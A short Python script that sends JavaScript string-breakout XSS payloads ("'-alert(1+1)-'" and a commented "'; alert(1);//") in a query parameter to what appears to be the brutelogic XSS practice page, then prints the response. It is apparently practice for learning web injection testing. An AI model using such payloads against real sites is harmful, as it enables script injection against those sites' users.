#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

# payload = "'; alert(1);//"
payload = "'-alert(1+1)-'"

params = {'p13': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
